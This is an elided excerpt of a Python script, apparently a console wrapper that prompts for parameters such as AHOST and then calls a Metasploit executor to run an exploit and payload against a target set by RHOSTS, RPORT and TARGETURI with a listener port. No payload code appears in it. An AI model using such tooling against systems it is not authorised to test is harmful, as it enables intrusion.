...
async def main():
    ...
    console.print(f"[bold yellow]  Parameter: AHOST[/]")
    console.print(f"  Description: ")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for AHOST [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and True:
        raise ValueError("Missing required parameter: AHOST")
    user_params["AHOST"] = user_input
    ...
    with console.status("[bold green]Configuring Metasploit payload..."):
        ...
        metasploit_executor.exploit_and_execute_payload(
            ...
            RHOSTS=user_params["RHOSTS"], RPORT=user_params["RPORT"], TARGETURI=user_params["TARGETURI"], AHOST=user_params["AHOST"], LPORT=user_params["LPORT"]
    )
